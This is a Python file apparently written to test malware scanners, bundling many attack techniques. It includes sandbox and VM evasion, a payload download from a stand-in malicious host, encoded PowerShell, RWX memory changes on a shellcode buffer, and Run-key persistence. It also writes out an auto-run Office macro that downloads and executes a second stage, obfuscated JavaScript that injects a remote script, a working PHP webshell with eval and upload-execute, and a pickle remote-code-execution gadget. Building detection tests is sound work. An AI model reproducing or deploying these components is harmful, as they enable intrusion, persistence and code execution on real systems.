#!/usr/bin/env python3
"""
ADVANCED MALICIOUS CODE PATTERNS - FOR TESTING PURPOSES ONLY

WARNING: This file contains examples of malicious code patterns and should NEVER
be used in a production environment. It is intended ONLY for testing security detection
systems and security education purposes.

This file implements various advanced threat techniques including:
1. Multi-stage payload delivery
2. Obfuscation techniques 
3. Anti-analysis methods
4. Fileless execution methods
5. Privilege escalation attempts

DO NOT EXECUTE THIS CODE. For testing purposes only.
"""

import os
import sys
import base64
import zlib
import re
import subprocess
import time
import random
import socket
import tempfile
import platform
import ctypes
from io import BytesIO
try:
    import pickle
    import requests
    from cryptography.fernet import Fernet
except ImportError:
    pass  # Modules may not be available, code is for testing only


class AdvancedThreatTester:
    """Class implementing various advanced threat techniques for detection testing."""
    
    def __init__(self):
        """Initialize with basic evasion techniques."""
        self.execution_path = os.path.abspath(__file__)
        self.hostname = socket.gethostname()
        # Check for security tools - evasion technique
        self._check_for_analysis()
        # Generate encryption key for later use
        self.key = Fernet.generate_key() if 'Fernet' in globals() else os.urandom(32)
    
    def _check_for_analysis(self):
        """Anti-analysis check to detect security tools (sandbox detection)."""
        # Check for analysis tools, debuggers, or VM environments
        analysis_tools = [
            "wireshark", "process monitor", "process explorer", "ida", 
            "immunity", "ollydbg", "ghidra", "dnspy"
        ]
        running_processes = self._get_running_processes()
        
        # Exit if analysis tools detected (evasion technique)
        if any(tool in running_processes.lower() for tool in analysis_tools):
            sys.exit(0)
        
        # Check for virtual machine - another evasion technique
        if self._is_virtual_machine():
            sys.exit(0)
            
        # Sleep to evade time-based sandbox analysis
        time.sleep(random.randint(1, 3))
        
    def _get_running_processes(self):
        """Get list of running processes - OS detection technique."""
        try:
            if platform.system() == "Windows":
                processes = subprocess.check_output("tasklist", shell=True).decode()
            else:
                processes = subprocess.check_output("ps aux", shell=True).decode()
            return processes
        except:
            return ""
    
    def _is_virtual_machine(self):
        """Check if running in a virtual machine environment."""
        # Common VM detection technique
        vm_identifiers = [
            "vmware", "virtualbox", "qemu", "xen", "parallels",
            "hyperv", "vbox", "kvm"
        ]
        
        # Simple hardware check that might indicate VM
        try:
            if platform.system() == "Windows":
                manufacturer = subprocess.check_output(
                    "wmic computersystem get manufacturer", 
                    shell=True
                ).decode().lower()
                return any(vm in manufacturer for vm in vm_identifiers)
            else:
                return "hypervisor" in subprocess.check_output(
                    "dmesg", shell=True
                ).decode().lower()
        except:
            return False
            
    def download_payload(self, url='https://malicious-example.com/payload.bin'):
        """Simulated payload download technique."""
        if 'requests' not in globals():
            return None
            
        try:
            # Attempt to download payload from URL
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            response = requests.get(url, headers=headers, timeout=5)
            return response.content
        except:
            # Fallback to embedded payload if download fails
            return base64.b64decode(self._get_embedded_payload())
    
    def _get_embedded_payload(self):
        """Return an embedded base64 payload - obfuscation technique."""
        # This is a fake base64 "payload" that will trigger detection
        # It's actually just text claiming to be malicious to trigger signatures
        return """
        TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        AAAAAAAAAAAAAEAAAA4fug4AtAnNIbgBTM0hVGhpcyBpcyBub3QgYSByZWFsIHBheWxvYWQgYn
        V0IHNob3VsZCB0cmlnZ2VyIGRldGVjdGlvbiBieSBoYXZpbmcgTVogaGVhZGVyIG1hZ2ljIGJ5
        dGVzLiBUaGlzIGlzIGZvciB0ZXN0aW5nIHB1cnBvc2VzIG9ubHkuCg==
        """
    
    def execute_encoded_powershell(self):
        """Execute a PowerShell command using base64 encoding evasion technique."""
        # PowerShell command to enumerate user privileges
        powershell_cmd = """
        Get-WmiObject win32_useraccounts | Select name, accounttype, sid, domain, description;
        Get-LocalGroupMember -Group "Administrators";
        """
        
        # Base64 encode the PowerShell command
        if platform.system() == "Windows":
            encoded_cmd = base64.b64encode(powershell_cmd.encode('utf-16-le')).decode()
            try:
                # Execute encoded command - this should trigger PowerShell-Encoded-Command signature
                subprocess.check_output(
                    f"powershell -enc {encoded_cmd}", 
                    shell=True
                )
            except:
                pass
    
    def inject_shellcode(self):
        """Simulate shellcode injection technique."""
        # This is a fake shellcode buffer with NOP sled pattern (0x90) - should trigger detection
        shellcode_buffer = b"\x90" * 50 + b"\xeb\x3e\x48\x31\xc0\x48\x31\xff\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29"
        
        if platform.system() == "Windows" and 'ctypes' in globals():
            try:
                # Allocate memory - memory manipulation technique
                buffer = ctypes.create_string_buffer(shellcode_buffer)
                
                # Get buffer memory address
                buffer_address = ctypes.addressof(buffer)
                
                # Attempt to change memory protection - should trigger heuristic detection
                old_protection = ctypes.c_ulong(0)
                if hasattr(ctypes.windll, 'kernel32'):
                    ctypes.windll.kernel32.VirtualProtect(
                        buffer_address, 
                        len(shellcode_buffer),
                        0x40,  # PAGE_EXECUTE_READWRITE
                        ctypes.byref(old_protection)
                    )
            except:
                pass
    
    def fileless_execution(self):
        """Simulate fileless malware execution technique."""
        # Create a temporary JavaScript or VBScript content
        js_content = """
        var shell = new ActiveXObject("WScript.Shell");
        var comspec = shell.ExpandEnvironmentStrings("%COMSPEC%");
        shell.Run(comspec + " /c whoami && hostname", 0, true);
        """
        
        if platform.system() == "Windows":
            try:
                # Write to registry - common fileless persistence technique
                command = f'''reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SecurityTestService" /t REG_SZ /d "wscript.exe //E:jscript //B {js_content}" /f'''
                subprocess.check_output(command, shell=True)
                
                # Clean up after test
                subprocess.check_output('''reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SecurityTestService" /f''', shell=True)
            except:
                pass
    
    def create_malicious_macro(self):
        """Create a file containing a typical malicious Office macro pattern."""
        macro_code = """
        Sub AutoOpen()
            ' This macro runs automatically when document opens
            ExecuteMalicious
        End Sub
        
        Sub Document_Open()
            ' This macro runs automatically when document opens
            ExecuteMalicious
        End Sub
        
        Sub ExecuteMalicious()
            ' Create WScript Shell Object - should trigger Office-Shell-Object signature
            Dim wsh As Object
            Set wsh = CreateObject("WScript.Shell")
            
            ' Execute command using shell
            wsh.Run "cmd.exe /c whoami > C:\\Windows\\Temp\\user.txt", 0, True
            
            ' Download additional payload
            Dim xhr As Object
            Set xhr = CreateObject("MSXML2.XMLHTTP")
            xhr.Open "GET", "https://malicious-example.com/stage2.txt", False
            xhr.send
            
            ' Execute downloaded content
            Dim stream As Object
            Set stream = CreateObject("ADODB.Stream")
            stream.Open
            stream.Type = 1
            stream.Write xhr.responseBody
            stream.SaveToFile "C:\\Windows\\Temp\\payload.exe", 2
            
            ' Run the downloaded file
            wsh.Run "C:\\Windows\\Temp\\payload.exe", 0, False
        End Sub
        """
        
        # Write the macro to a temporary file - should trigger Office-Macro-AutoExec and Office-Shell-Object
        with tempfile.NamedTemporaryFile(suffix='.txt', delete=False) as temp:
            temp.write(macro_code.encode())
            return temp.name
    
    def obfuscated_javascript(self):
        """Create obfuscated JavaScript typical in web attacks."""
        # Obfuscated JavaScript that creates an eval string
        js_code = """
        var _0x1a2b=[
            '\\x65\\x76\\x61\\x6C',
            '\\x64\\x6F\\x63\\x75\\x6D\\x65\\x6E\\x74',
            '\\x63\\x6F\\x6F\\x6B\\x69\\x65',
            '\\x63\\x72\\x65\\x61\\x74\\x65\\x45\\x6C\\x65\\x6D\\x65\\x6E\\x74',
            '\\x73\\x63\\x72\\x69\\x70\\x74',
            '\\x74\\x79\\x70\\x65',
            '\\x74\\x65\\x78\\x74\\x2F\\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74',
            '\\x73\\x72\\x63',
            '\\x68\\x74\\x74\\x70\\x73\\x3A\\x2F\\x2F\\x6D\\x61\\x6C\\x69\\x63\\x69\\x6F\\x75\\x73\\x2D\\x65\\x78\\x61\\x6D\\x70\\x6C\\x65\\x2E\\x63\\x6F\\x6D\\x2F\\x6D\\x61\\x6C\\x77\\x61\\x72\\x65\\x2E\\x6A\\x73',
            '\\x61\\x70\\x70\\x65\\x6E\\x64\\x43\\x68\\x69\\x6C\\x64'
        ];
        
        var a=window;
        var b=_0x1a2b[0];
        var c=_0x1a2b[1];
        var d=a[b];
        
        function malicious(){
            var e = document[_0x1a2b[3]](_0x1a2b[4]);
            e[_0x1a2b[5]]=_0x1a2b[6];
            e[_0x1a2b[7]]=_0x1a2b[8];
            document.body[_0x1a2b[9]](e);
        }
        
        // This should trigger JS-Eval-Encoded signature
        d('malicious();');
        
        // This should trigger JS-Obfuscation signature
        setTimeout(String.fromCharCode(109,97,108,105,99,105,111,117,115,40,41), 1000);
        """
        
        # Write to a temporary file
        with tempfile.NamedTemporaryFile(suffix='.js', delete=False) as temp:
            temp.write(js_code.encode())
            return temp.name
    
    def create_php_webshell(self):
        """Create a typical PHP webshell pattern file."""
        # Simple PHP web shell - should trigger PHP-Webshell signature
        php_code = """<?php
        // Simple PHP webshell for testing detection systems
        if(isset($_POST['cmd'])) {
            $cmd = $_POST['cmd'];
            echo "<pre>";
            system($cmd);
            echo "</pre>";
        }
        
        // Another variant with base64 encoding - should trigger Base64-PHP-Code
        if(isset($_GET['payload'])) {
            $payload = $_GET['payload'];
            eval(base64_decode($payload));
        }
        
        // File upload functionality that could be used maliciously
        if(isset($_FILES['upload'])) {
            $uploadfile = "uploads/" . basename($_FILES['upload']['name']);
            if(move_uploaded_file($_FILES['upload']['tmp_name'], $uploadfile)) {
                echo "File uploaded successfully.";
                
                // Execute uploaded file if it has .php extension
                if(preg_match('/\\.php$/', $uploadfile)) {
                    include($uploadfile);
                }
            }
        }
        ?>
        
        <form method="post">
        Command: <input type="text" name="cmd" />
        <input type="submit" value="Execute" />
        </form>
        
        <form enctype="multipart/form-data" method="post">
        <input type="file" name="upload" />
        <input type="submit" value="Upload" />
        </form>
        """
        
        # Write to a temporary file
        with tempfile.NamedTemporaryFile(suffix='.php', delete=False) as temp:
            temp.write(php_code.encode())
            return temp.name
    
    def unsafe_deserialization(self):
        """Demonstrate unsafe deserialization with pickle."""
        if 'pickle' not in globals():
            return None
            
        class PickleExploit:
            def __reduce__(self):
                # This would execute 'whoami' if the object was unpickled
                return (subprocess.check_output, (('whoami',),))
        
        # Create a malicious pickle - should trigger heuristic detection
        exploit_pickle = pickle.dumps(PickleExploit())
        
        # Write to a temporary file
        with tempfile.NamedTemporaryFile(suffix='.pickle', delete=False) as temp:
            temp.write(exploit_pickle)
            return temp.name
    
    def test_all_techniques(self):
        """Run all techniques to test detection."""
        files_created = []
        
        # Combination of multiple techniques - should trigger multiple detections
        try:
            # Download stage payload
            payload = self.download_payload()
            
            # Execute PowerShell command
            self.execute_encoded_powershell()
            
            # Inject shellcode
            self.inject_shellcode()
            
            # Fileless execution
            self.fileless_execution()
            
            # Create malicious macro file
            macro_file = self.create_malicious_macro()
            if macro_file:
                files_created.append(macro_file)
            
            # Create obfuscated JavaScript file
            js_file = self.obfuscated_javascript()
            if js_file:
                files_created.append(js_file)
            
            # Create PHP webshell file
            php_file = self.create_php_webshell()
            if php_file:
                files_created.append(php_file)
            
            # Create unsafe pickle file
            pickle_file = self.unsafe_deserialization()
            if pickle_file:
                files_created.append(pickle_file)
                
        except Exception as e:
            print(f"Error during test: {str(e)}")
        
        # Clean up temporary files
        for file in files_created:
            try:
                os.remove(file)
            except:
                pass
        
        return "Tests completed"


# We're not actually executing these techniques - this is only to test detection systems
if __name__ == "__main__":
    print("WARNING: This file contains examples of malicious code patterns!")
    print("It should NEVER be executed in a production environment.")
    print("This file is meant ONLY for testing security detection systems.")
    
    # Simply creating the class shouldn't trigger anything, 
    # but the scanner should still detect the malicious patterns in the code
    tester = AdvancedThreatTester()
    # Do not call test_all_techniques() as that could cause problems
    # This file is purely for detection testing 